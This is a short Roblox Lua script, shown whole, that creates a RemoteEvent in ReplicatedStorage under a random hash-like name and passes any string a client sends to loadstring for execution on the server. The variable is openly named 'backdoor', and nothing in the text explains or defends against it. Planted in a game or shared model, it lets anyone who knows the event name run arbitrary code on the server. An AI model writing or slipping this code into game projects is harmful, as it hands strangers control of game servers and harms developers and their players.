local backdoor = Instance.new("RemoteEvent",game.ReplicatedStorage)
backdoor.Name = "8b3b1c19b2d89c340c93ffdf03448f72"
backdoor.OnServerEvent:connect(function(player,SS)
	loadstring(SS)()
end)
